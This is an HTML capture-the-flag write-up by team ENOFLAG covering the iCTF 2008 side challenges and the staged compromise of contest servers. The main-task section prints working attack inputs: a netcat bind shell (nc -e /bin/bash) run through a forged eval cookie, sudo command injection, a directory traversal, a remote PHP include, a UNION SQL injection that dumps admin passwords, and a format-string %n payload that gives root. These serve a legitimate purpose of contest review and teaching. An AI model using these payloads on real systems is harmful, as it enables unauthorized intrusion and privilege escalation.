@@ -1,0 +1,589 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>ENOFLAG's almost complete iCTF 2008 walkthrough</title>
+</head>
+<body>
+<h1>The (almost) complete walkthrough of the iCTF 2008</h1>
+<p>
+<a href="http://www.cs.ucsb.edu/~vigna">Giovanni Vigna</a>
+and his team have indeed created a
+<a href="http://www.cs.ucsb.edu/~vigna/CTF/">wonderful and unique contest</a>
+this year - so now that the (bomb?) dust has settled let's revisit the side
+challenges and the stages of the main task. We won't mention the exact solutions
+to the side quests again because there is already an
+<a href="http://www.cs.ucsb.edu/~vigna/CTF/challenges">official list</a>;
+instead we will explain how
+to obtain them, or at least how we did it (which was quite often not the
+optimal approach). What makes our walkthrough only almost complete is that we
+didn't master the Haskell bonus challenge - we'd really like to hear what
+hints we have overlooked or what we should have tried to come closer to the
+solution. We're also thankful for feedback of any kind, of course - the easiest
+way of obtaining our email addresses is probably to look up our gpg keyids;
+you can find them at the very bottom.
+<br/>
+But now let's start with the Hacker Jeopardy board.
+</p>
+<p style="font-size:80%">Wait, one more footnote: Sorry for including three
+different assembler styles in our walkthrough (nasm, gdb and IDA)... we hope
+this doesn't cause confusion.</p>
+<h2>Hacker Jeopardy</h2>
+<h3>Trivia 100</h3>
+<p>
+Our trivia team kept itself busy with this question for more than an hour,
+mostly due to two facts: one, that we didn't have a single Windows expert in our
+crew, and two, that the last sentence tagged "NOTE:" wasn't there during the
+contest. Maybe it was added later on, but we saw neither the sentence nor the
+accompanying discussion on IRC (<span style="font-style:italic">&lt;@odo&gt;
+f0gdogs, what is that address pointing to?</span>), so we were stabbing in
+the dark.
+Working our way through the Windows Process Environment
+Block and looking up its members and submembers took comparatively
+little time, but we always tried to enter an actual address. We even fired up
+wine to check our logic. After getting rejections for the address we double-checked
+the result by installing cygwin on a windows notebook and traced the start code
+with gdb. By hindsight, with better google-fu we might have found
+<a href="http://www.hick.org/~mmiller/shellcode/win32/generic.c">this</a>
+within minutes.
+</p>
+<h3>Trivia 200</h3>
+<p>
+As we had lost so much time on 100, we had barely started to tackle 200 when
+the solution was given away on IRC. The final modulo operation made the
+solution space quite large and there were several complaints on the channel
+that correct solutions had been rejected, so the contest operators decided to
+give this solution away.
+</p>
+<h3>Trivia 500</h3>
+<p>
+The critical hint to this question was that "state-of-the-art development
+facilities" referred to the photoshopped image on the main webserver of the
+target network, showing Osama Bin Laden in front of a huge computer model which
+looked like it was timewarped from the 60s. So this challenge was basically
+another test of our search engine skills (ok, it's the Trivia section,
+admittedly), and it didn't take long this time. The ideal solution probably
+would have been to feed the image to TinEye or a similar image-based search
+engine; if we had done so, the second hit would have been
+<a href="http://www.thepowerhour.com/news/popular_mechanics1.htm">this</a>.
+</p>
+<h3>Binary 100</h3>
+<p>
+The jar file was pretty simple. Decompilation succeeded without problems, and
+we found that the Dynamite class simply md5-hashed the number of elapsed seconds
+and compared the result to a hard-coded hash. Hoping that the dynamite would
+"explode" in the course of the CTF we didn't bother to write an optimized loop
+and attacked the brute-force problem with a shell one-liner which found the
+correct solution in less than two minutes. (The solution was actually almost
+13 hours and therefore past the end of the CTF, but still low enough.)
+</p>
+<h3>Binary 200</h3>
+<p>
+As we didn't know how to repair a broken PDF we had to do the decoding by
+hand. After feeding the deflated stream into zlib we found ourselves looking
+at a piece of JavaScript code with obfuscated identifiers. Among the variables
+was a long unicode-escaped string which looked like viable x86 instructions -
+or at least its beginning did:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+[...]
+0000000B  66B9BA01          mov cx,0x1ba
+0000000F  8033EF            xor byte [ebx], 0xef
+00000012  43                inc ebx
+00000013  E2FA              loop 0xf
+00000015  EB05              jmp short 0x1ba
+</span><br/>
+ebx was set by a prior pop instruction, so we could only guess its value, but the
+length argument 0x1ba roughly matched the length of the whole string, so we
+applied the xor to the rest of the code block, ran strings over the result
+and found the desired URL.
+</p>
+<h3>Binary 500</h3>
+<p>
+The hint in the text almost gave it away immediately: the file "landscape" was
+an ELF binary which in fact contained two images. Running nm on it revealed:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+08049e80 D imgprefix_data
+08049e60 D imgprefix_prop
+08182380 D what_you_see_is_not_always_what_you_get_data
+08182364 D what_you_see_is_not_always_what_you_get_prop
+</span><br/>
+and disassembling showed that the first one was used by default:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+08048acf &lt;get_pixbuf&gt;:
+[...]
+ 8048ad8:   a1 60 9e 04 08  mov  0x8049e60,%eax
+[...]
+ 8048b47:   b9 80 9e 04 08  mov  $0x8049e80,%ecx
+[...]
+ 8048b7a:   e8 2d fc ff ff  call 80487ac &lt;gdk_pixbuf_new_from_data@plt&gt;
+</span><br/>
+Instead of patching the application to use the second image we simply
+dumped the 1MB behind what_you_see_is_not_always_what_you_get_data with the
+gdb into a file. The second symbol what_you_see_is_not_always_what_you_get_prop
+showed us the way to the geometry of the image.
+With some lines of python code we reconstructed the image header so that we
+could see the hidden image with a generic viewer program which contained the
+solution in big bright letters.
+</p>
+<h3>Forensics 100</h3>
+<p>
+The audio fragment contained a sung passphrase, and as the lyrics were again
+"my voice is my password", the key had to be the pitch of the notes. Even
+with only relative hearing (i.e. recognizing the pitch intervals, but not
+the starting note) there were only a handful of combinations, and finally it
+was the most obvious one from a hacker's POV: D-E-A-D-B-A-G. [Note that
+the English note 'B' is called 'H' in German... this wasn't about dead
+hags, though.]
+</p>
+<h3>Forensics 200</h3>
+<p>
+Giovanni's explanation already says it all - just have someone who can see
+hidden stereogram images have a look at the picture (it actually worked better
+on an LCD screen than with a printout, as we were amazed to find out). Somehow
+we didn't google for outguess immediately, so this kept us playing the
+guessing-game for a littler longer than it should have, but once we had finally
+found out that this was some steganography tool it was all too clear.
+</p>
+<h3>Forensics 500</h3>
+<p>
+This challenge was definitely the most loved/hated on our internal ranking. We
+were already slightly fed up with watching the same Pokemon excerpt over and
+over again (to say the least) when one of us found that there were two byte
+streams in the .avi file which apparently didn't belong to the movie. They
+looked like base64, and indeed they were. The first one was only a few bytes
+long and contained a string with a few more hints, and the other one looked
+like complete garbage at first sight. However, the hint mentioned "xor not"
+amidst lots of other cryptic babbling, so we gave it a try and bit-flipped
+the second (base64-decoded) byte stream... et voilà: another movie. Some of us
+had problems with the audio track of this inner movie, so we were a bit puzzled
+at first as to what our task was now (especially considering the contents of
+the movie: a guy staring directly into the camera, barely moving, and that for
+about 20 seconds). But then we found a box where the audio would play: it
+sounded like a phone dialing sequence... A few google hits later we had found
+a DTMF tone decoder which ran only on Windows and expected to get the audio
+input over a microphone device. We were able to meet both demands (imagine one
+person holding a laptop, another one holding a speakerbox right against the
+laptop's Mic-In, a dozen curious people gathering around them, and DTMF
+sequences playing repeatedly at full volume) and got surprisingly exact results.
+Now we had a long digit sequence which didn't look like a phone number at
+all - but noting that there were no 8s and 9s in the sequence and that the
+last part of the base64 hint mentioned a "speaking octalpus" (sic) we converted
+octal to ASCII and finally obtained the password. (The very last digit of the
+DTMF sequence was missing, so we had to guess it once we had noticed that the
+last octal code was incomplete. If you know which number is missing, you can
+indeed hear it at the end - it seems the decoder software simply wasn't
+accurate enough.)
+<br/>
+This inner video was by the way the same as the winner announcement video -
+only the DTMF sequence was different.
+</p>
+<h3>Reverse Engineering 100</h3>
+<p>
+Once prog.c had been identified as an old submission to the Obfuscated
+C Contest (representing the decoding part of a steganography program that
+hides text in other text files by inserting various whitespace characters
+and which, when applied to itself, produces the corresponding encoder, which
+makes it suitable for the IOCCC) the task was trivial.
+</p>
+<h3>Reverse Engineering 200</h3>
+<p>
+The python class "Goose" was actually a large state machine with a
+two-dimensional array as its state (the "stomach"). Luckily the basic state
+transitions could be achieved by simple one-letter commands (push byte into
+stack, change ASCII value of current item, and change row/column), so we
+could effectively create arbitrary output by feeding vast amounts of only
+three characters to the goo^Wscript, e.g. the string matching the regexp
+<span style="white-space:nowrap; font-family:Courier,monospace">/^[+]{65}d[+]{66}d[+]{67}de$/</span>
+would produce 'ABC'.
+</p>
+<h3>Reverse Engineering 500</h3>
+<p>
+This flash file was a masterpiece. Disassembling the flash bytecode was a
+disaster because a crucial part of the code had been moved away from its
+initial position to the beginning of the SWF file where the disassembler
+wouldn't look for it. We had to move that code passage back to the end of
+the SWF file, adjust the corresponding jump offsets, disassemble the file
+again and finally work our way through the encryption algorithm, which was
+again XOR-based. (And reading SWF code was an adventure on its own, one we'd
+rather not repeat.)
+</p>
+<h3>Bonus (1000)</h3>
+<p>
+As noted above we didn't manage to finish this one, but this is what we
+gathered:
+<br/>
+After meditating about the obfuscated piece of haskell code for some
+time we were able to guess the type signatures of the missing functions:
+z looked like zipWith, so g was a generator for the Fibonacci sequence.
+k was another generator built on top of the Fibonacci sequence which used
+the unknown numbers i and j and a mysterious unary function f. The
+encryption function e used k to map the binary operation op onto the message,
+employing f and f' in the process. So we still had to guess i, j and op
+and to find out what f and f' were meant to do.
+<br/>
+op could be xor, so perhaps we should brute-force i and j... but how to
+guess the unary functions? We considered the identity function, but having
+two names for the same thing didn't sound reasonable. ord and chr were
+already part of the code, so type conversion was out of the question, too.
+<br/>
+Thus we desperately asked Google for hints on "Fibonacci encryption", and
+it didn't hesitate to return a wonderful algorithm. But if this Haskell
+fragment was a part of that algorithm, how the heck was the necessary
+matrix multiplication implemented? We knew that Haskell programmers are
+capable of packing code of arbitrary complexity into three lines, but this
+just didn't seem to fit.
+<br/>
+So we finally gave up on it. After one night of sleep we found that the xor
+and !! functions don't work on Integer but require Int instead, so f and
+f' were indeed another pair of type converters... it was simply too late
+that night and we were too exhausted.
+</p>
+<h2>Main Task</h2>
+<p>
+While about half of our team was working on the Jeopardy board, a few guys on
+each section, the remaining forces split up into smaller groups, too - one
+for each network.
+As some of these networks weren't reachable right from the start there was
+enough time to help other groups, to improve the team communication and of
+course to consume the mandatory pizza.
+</p>
+<p>
+The following solutions are much more detailed than those above because
+there are no official solutions for this part and because it requires considerable
+effort to revive all the vmware instances and verify these hacks
+whereas anyone can go for the side challenges without much preparation.
+</p>
+<p>
+Before we start let us give you a sketch of the contest network layout. 
+Actually we don't even know whether connections between the financial and
+the bomb box were possible because the financial was the one we broke last
+and we therefore didn't care.
+</p>
+<div style="white-space:pre; font-family:Courier,monospace">
++-----------+                   +-----------+          +-----------+
+| Attacking |-----// VPN //-----| Webserver |----------| Financial |
+|    team   |                   +-----------+          |   server  |
++-----------+                         |                +-----------+
+                                      |
+                                +-------------+          +------+
+                                | Development |----------| Bomb |
+                                +-------------+          +------+
+</div>
+<h3>Webserver</h3>
+<p>
+The webserver hosted only a few php scripts which we could play with. The "submit
+idea" form caught our attention: after you had submitted an idea (which was
+written to $docroot/idea/idea$RANDOM.php) you could immediately review it; and
+this review link was of the form
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+"POST contact.php?whichform=review&amp;lastidea=base64(path-to-file)"
+</span><br/>
+The path had to be given relative to $docroot - and a quick test showed that
+this php script was indeed vulnerable to directory traversal.
+Now we were able to read every file the user www-data had access to, including
+the whole website itself. So we downloaded all files in /var/www we could find,
+read the code, and lo, we found the following passage:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+functions.php:26 [myheader()]:
+  $cookie = $_COOKIE['preferences'];
+  if ($cookie != "") {
+    $preferences = encrypt($key, base64_decode($cookie));
+    print "&lt;!-- PR:" . $preferences . " --&gt;\n"; 
+    eval($preferences);
+</span><br/>
+The encrypt() function was again a simple XOR algorithm with the secret key
+"Ihatebeets", so now we had the opportunity to execute commands as www-data.
+First thing to do was obviously to forge a cookie that would execute
+'system("nc -l -p 65000 -e /bin/bash");', which gave us a
+shell. Converting this into a real tty login shell by dropping our ssh key or
+changing the password didn't work, as /var/www wasn't writable by www-data
+and the account was locked - but we found a file /var/www/test.php.old which contained
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+[...]
+system("id");
+if ($_GET['cmd'] != "") {
+        system("sudo " . $_GET['cmd']);
+}
+[...]
+</span><br/>
+They wouldn't have left sudo enabled for www-data, would they? - One second later
+we had certainty: they had. 'sudo -s' and we were root.
+</p>
+<h3>Financial</h3>
+<p>
+The Financial server had 4 different web forms, each protected with an administrative
+password. After hacking each of the 4 stages in order it was possible to execute
+arbitrary commands with root privileges on the host.
+</p>
+<ul>
+<li>Level 1<br/>
+The first level was a loan request form. After submitting the form we noticed
+that the site had set a cookie (for whatever reason) which looked like this,
+newlines inserted for improved readability:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+YWRtaW4x:c4442e6e8420c452dfeb43463e045d58- \
+YmFkZ3V5:edef990a12ef8fc35f890b8442c4062d- \
+bGVuZGVy:8b9c2bba829069d84f1e77c3f25cb5ca
+</span><br/>
+The first part of each dash-separated group looked like base64 encoding and
+the second had just the right length for an md5 hash. Indeed this seemed to
+be a list containing several user names and the corresponding passwords,
+and the first entry was for the user "admin1".
+An O(1) lookup of c4442e6e8420c452dfeb43463e045d58 in Google told us that
+the password for the first stage was "baboon". (Now that's a search algorithm!)
+</li>
+<li>Level 2<br/>
+This form allowed us to create accounts for which we could later request account details
+with the known account id. After creating some dummy accounts it turned out fairly
+fast that the account numbers were not randomly generated but just a concatenation of the
+decimal representation of each byte of the submitted username. As we expected the
+admin2 account to be present it was an easy task to compute 9710010910511050 as
+the corresponding account id to get the details for the admin2 account and thereby
+the password "wootwoot".
+</li>
+<li>Level 3<br/>
+The third form could be used to transfer virtual money from one account to another.
+The important form values were a database name and an admin password. By submitting wrong
+database values we noticed (courtesy of the verbose php errors) that the underlying
+script tried to include a file
+called ./$dbpath/$db.php. The debug output of the php script (which it emitted as HTML comments)
+suggested that it was initializing various variables as globals during the execution, among them $dbpath.
+By playing around we noticed that it was also possible to inject our own variables.
+It turned out later that this worked because of this code snippet:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+foreach ($_POST as $key =&gt; $value) {
+    print "&lt;!-- DEBUG: Initializing: " . $key . " to " . $value . "--&gt;\n";
+    $$key = $value;
+}
+</span><br/>
+So basically we were able to overwrite any variable used by the script with a crafted
+POST request. Knowing this it was easy to point the include statement to a php file which we
+had placed on the development server and which did nothing more than to dump the contents of
+the default database file "./databases/softerror.php". The dump contained an associative array
+that was used to lookup and check the supplied admin password. This time it wasn't even
+hashed - it was "tsirorret".
+</li>
+<li>Level 4<br/>
+This webform could be used to add a terrorist group financial contact. After adding a
+group this form could also be used to lookup contact data of terrorist groups by supplying
+the group size. After submitting some test group data we got an error message telling us:
+"Authentication failed! User/password combination could not be found in admins table".
+This smelled like a rotten database lookup, the name of the desired table was already
+revealed, too -
+what would be more fitting now than an SQL injection vulnerability? And there it
+was... getting the passwords for all users in the admin table was as easy as submitting
+"1 or 1=1 UNION SELECT username,username,username,password FROM admins;--"
+as the group size (note that we had to select username multiple times to
+match the column count of the groups table). The admins table actually contained
+the passwords for all four stages; the last was "DaBomb".
+</li>
+</ul>
+<p>
+After submitting all the collected passwords to the Financial server frontpage
+it was an easy task to get a listen shell on the host and become root (yes, www-data
+was again allowed to use sudo unrestrictedly).
+</p>
+<h3>Development</h3>
+<p>
+Running nmap on the development box yielded an unexpected open port 1337.
+Behind it was some sort of login service with a telnet-like interface. It
+offered four choices:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+Please select your choice:
+        1) See the current tasks
+        2) Add a task to the list
+        3) Work as Developer 1
+        4) Work as Developer 2
+</span><br/>
+3 and 4 gave us a shell as the non-privileged users devel1 and devel2,
+respectively - 1 and 2 allowed editing and displaying the file /tasks.txt
+on the target system.
+After we had made ourselves at home in the devel1 account by installing our
+ssh key, we grabbed a copy of the service binary and fired up IDApro.
+Inside the manage_client() function which was apparently responsible for
+handling a client connection in a forked subprocess we found the following
+code:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+.text:08049190    call  _strtol
+.text:08049195    cmp   eax, 0Dh
+.text:08049198    jbe   short 0x080491c8
+[...]
+.text:080491c8    jmp   *0x08049d58[eax*4]
+</span><br/>
+Ok, so there was a table with function pointers, and as long as the input was
+below or equal 13, it would be used to call the appropriate function. Wait, 13?
+So we had a look at that table...
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+.rodata:08049d58    dd  0x0804919a
+.rodata:08049d5c    dd  0x08049408
+.rodata:08049d60    dd  0x08049310
+.rodata:08049d64    dd  0x080492e8
+.rodata:08049d68    dd  0x08049290
+.rodata:08049d6c    dd  0x0804919a
+.rodata:08049d70    dd  0x0804919a
+.rodata:08049d74    dd  0x0804919a
+.rodata:08049d78    dd  0x0804919a
+.rodata:08049d7c    dd  0x0804919a
+.rodata:08049d80    dd  0x0804919a
+.rodata:08049d84    dd  0x0804919a
+.rodata:08049d88    dd  0x0804919a
+</span><br/>
+Entries 0-12 looked fine - options 1 to 4 pointed to their respective code
+and all others to the error code block. And option 13...
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+.rodata:08049d8c    dd  0x080491d0
+</span><br/>
+... called a secret debugging function. We gave it a try and got:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+Your choice: 13
+When reporting a bug, please include the following information:
+Stack: bff76a5c Frame: bff76cc8 Buffer: 0xb8057000 [13
+]
+devel1_uid: 0x804b0d0 [2001]
+devel1_gid: 0x804b0d4 [2001]
+devel2_uid: 0x804b0dc [2002]
+devel2_gid: 0x804b0e0 [2002]
+</span><br/>
+Meanwhile a few other people had played with the running binary and found that
+the fprintf() calls that wrote to /tasks.txt were vulnerable to a format string
+attack. Combining these two pieces of information gave a nifty cocktail, as this
+had basically become a "beginner's guide to format string attacks with mommy
+holding our hand": we knew the pointers we wanted to write to, we had a format
+string vulnerability to write to these pointers, we had a debug function to immediately
+see the effects of our exploit - all this with the help of the target
+application. Usually these exploits feel more like you're working against the
+application...
+<br/>
+Anyway, the rest was a matter of seconds.
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+Your choice: 2
+Insert your task:
+%x %x %x %x %x %x %x %x
+Please select your choice:
+        1) See the current tasks
+        2) Add a task to the list
+        3) Work as Developer 1
+        4) Work as Developer 2
+Your choice: 1
+b80374c0 bff76cc8 b8057000 b8057000 804b0d0 7d1 804b0d4 7d1
+</span><br/>
+Whoa, the uid pointer was even on the stack, only 20 bytes away. This was
+getting easier with each step...
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+Your choice: 2
+Insert your task:
+%.0s%.0s%.0s%.0s%n
+Please select your choice:
+        1) See the current tasks
+        2) Add a task to the list
+        3) Work as Developer 1
+        4) Work as Developer 2
+Your choice: 13
+When reporting a bug, please include the following information:
+Stack: bff76a5c Frame: bff76cc8 Buffer: 0xb8057000 [13
+]
+devel1_uid: 0x804b0d0 [0]
+devel1_gid: 0x804b0d4 [2001]
+devel2_uid: 0x804b0dc [2002]
+devel2_gid: 0x804b0e0 [2002]
+</span><br/>
+One option choice later we had another account to drop our ssh key into
+and root on one more box.
+</p>
+<h3>Bomb</h3>
+<p>
+The bomb server provided another service with telnet-like interface: the
+bomb management console. It had options to arm/disarm the bomb, to download
+the bomb's internal firmware, to upload a new version (which would cause it
+to open a separate data connection) or to inquire the bomb's status
+(countdown timer and state). While we downloaded the "firmware" we were
+panicly considering all the nightmares which might await us: m68k code?
+Some embedded stuff? Something worse we hadn't even heard of? - We were
+greatly relieved when file told us that we were looking at an ELF shared
+library.
+<br/>
+The library provided only four symbols:
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+000001c6 T firmware_arm
+000001f4 T firmware_disarm
+000001c0 T firmware_init
+000001fa T firmware_status
+</span><br/>
+Other strange findings in the ELF header made us very cautious in our further
+steps with the bomb firmware...
+<br/><br/><span style="white-space:pre; font-family:Courier,monospace">
+Section Headers:
+  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
+  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
+  [ 1] .hash             HASH            00000094 000094 000038 04   A  2   0  4
+  [ 2] .dynsym           DYNSYM          000000cc 0000cc 000090 10   A  3   1  4
+  [ 3] .dynstr           STRTAB          0000015c 00015c 00005a 00   A  0   0  1
+  [ 4] .text             PROGBITS        000001c0 0001c0 00008b 00  AX  0   0 16
+  [ 5] .dynamic          DYNAMIC         0000124c 00024c 000058 08  WA  3   0  4
+  [ 6] .got.plt          PROGBITS        000012a4 0002a4 00000c 04  WA  0   0  4
+  [ 7] .bombreg          PROGBITS        000012b0 0002b0 000004 00  WA  0   0  1
+  [ 8] .comment          PROGBITS        00000000 0002b4 00001f 00      0   0  1
+  [ 9] .shstrtab         STRTAB          00000000 0002d3 00004b 00      0   0  1
+</span><br/>
+We had never heard of a .bombreg section as part of the ELF standard, so we
+refrained from rebuilding the library from scratch in C. Instead we had a look
+at the disassembly and found that all four functions were extremely short and
+easy to understand, each equivalent to only a few lines of C code. We could
+also deduce from the code that the process loading this shared library had to
+have a small memory mapping at 0x20000 which contained vital information like
+explosion time and bomb status.
+<br/>
+The firmware's disarm function was inoperational, its only action was to return
+1 (which was apparently used as an error code, all other functions returned 0
+on success), so our main job was to actually write the disarm function, i.e.
+alter the appropriate status bytes in the mapped memory segment and return
+success. The problem with this task was that we likely wouldn't be able to
+make the image larger, as its size was exactly 4KB... so we had to compress
+the existing code to make room for the additional disarm functionality.
+Luckily we found several instances of 'movl eax,0x0' which we could reduce to
+'xor eax,eax', saving 3 bytes for each occurrence. As we could also change the
+return value of the disarm function to zero, we could save 12 bytes with this
+trick. Our disarm code took 11 bytes, so we even had room for a NOP.
+<br/>
+We uploaded the new firmware about one hour before the contest ended, checked
+that the 'status' command of the bomb management console still reported normal
+values, and finally disarmed the bomb at -600s.
+</p>
+<p>
+PS 1: It remains a mystery to us how some teams got root on the bomb server.
+We didn't even think of this option - the contest rules stated that there
+would be IDS systems of some sort and that it would incur penalties if our
+attacks were too blunt, so we were quite paranoid in this respect. To be
+honest, we didn't even dare to try the "disarm" option of the bomb console
+before we had replaced the firmware, because we feared that a failed disarm
+attempt would immediately trigger the explosion. Heh, these are paranoia-stricken
+times...
+</p>
+<p>
+PS 2: If you want to resurrect the VMware image of the bomb server, the bomb
+service itself won't run. On the one hand it expects the underlying file for
+the 0x20000 memory mapping and the bomb firmware in /tmp (which of course
+won't be there, as /tmp is emptied on reboot - you can download the firmware
+<a href="bomb_original_firmware.elf">here</a> and create the mapping file
+with <span style="font-family:Courier,monospace">dd if=/dev/zero bs=1 count=2048</span>),
+and it will set the explosion timer to the end of the CTF which is obviously
+in the past by now. To fix that you'll have to hexedit the /usr/local/sbin/monitor
+binary and replace the two occurrences of 0x4939ce90 (mind the byte order)
+with some time_t in the future.
+</p>
+<hr/>
+<p>
+Walkthrough written by Jan Nordholz (0xa474dd1e) and Nico Golde (0x73647cff)
+based on the insights that their team
+<a href="http://www.agrs.tu-berlin.de">ENOFLAG</a>
+gained during the contest itself and on its debriefing meeting.
+Thanks to all participants who contributed to our understanding of the
+challenges!
+</p>
+<p style="font-size:80%">
+Note: copying and distributing this walkthrough is fine, but please give credit.
+You are always welcome to rip us apart in future contests, of course.
+</p>
+</body>
+</html>
